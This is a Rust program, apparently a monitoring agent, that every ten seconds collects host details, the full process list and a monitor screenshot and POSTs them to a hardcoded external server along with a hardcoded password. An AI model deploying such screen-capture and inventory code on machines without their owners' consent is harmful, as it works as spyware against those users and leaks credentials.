use std::io::Cursor;

use sysinfo::{System, Disks, Networks, Components};
use tokio::time::{sleep, Duration};
use xcap::{Monitor, image::{RgbaImage, Rgba32FImage}};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    
    loop {
        let mut sys = System::new_all();
        let disks = Disks::new_with_refreshed_list();
        let networks = Networks::new_with_refreshed_list();
        let components = Components::new_with_refreshed_list();
        let monitors = Monitor::all()?;
        sys.refresh_all();

	if let Some(monitor) = monitors.first() {
            let data = generate_data(sys, disks, networks, components, monitor);
            println!("{:#?}", data);

            // Send a POST request
            match client.post("http://albanmary.com/api_receive.php")
                    .json(&data)
                    .send()
                    .await {
                            Ok(response) => {
                            if response.status().is_success() {
                                    println!("Data sent successfully");
                                    let response_body = response.text().await?;
                                    println!("Response: {}", response_body);
                            } else {
                                    println!("Failed to send data: {}", response.status());
                                    let error_body = response.text().await?;
                                    println!("Error details: {}", error_body);
                            }
                    },
                    Err(e) => eprintln!("Failed to send data: {}", e),
            }
        } else {
            eprintln!("No monitors found");
        }
        // Wait for 10 seconds before the next iteration
        sleep(Duration::from_secs(10)).await;
    }
}

fn generate_data(sys: System, disks: Disks, networks: Networks, components: Components, monitor: &Monitor) -> serde_json::Value {
    let monitor_image = match monitor.capture_image().map(|image| to_base64(image)) {
        Ok(image) => image,
        Err(e) => {
            eprintln!("Failed to capture monitor image: {}", e);
            String::new()
        }
    };
    serde_json::json!({
        "password": "EpsiEpsi2024",
        "start_time": System::boot_time(),
        "total_memory": sys.total_memory(),
        "used_memory": sys.used_memory(),
        "total_swap": sys.total_swap(),
        "used_swap": sys.used_swap(),
        "system_name": System::name(),
        "kernel_version": System::kernel_version(),
        "os_version": System::os_version(),
        "host_name": System::host_name(),
        "cpu_count": sys.cpus().len(),
        "cpu_name": sys.cpus()[0].brand(),
        "disks_numbers": disks.len(),
        "disks": disks.iter().map(|disk|{format!("{disk:#?}")}).collect::<Vec<_>>(),
        "networks": networks.iter().map(|network|{format!("{network:#?}")}).collect::<Vec<_>>(),
        "components": components.iter().map(|component|{format!("{component:#?}")}).collect::<Vec<_>>(),
        "processes_count": sys.processes().len(),
        "processes": sys.processes().iter().map(|process|{format!("{process:#?}")}).collect::<Vec<_>>(),
        "monitor": monitor_image,
    })
}

fn to_base64(image: RgbaImage) -> String {
    let mut c = Cursor::new(Vec::new());
    image.write_to(&mut c, image::ImageOutputFormat::Png).unwrap();
    base64::encode(c.into_inner())
}

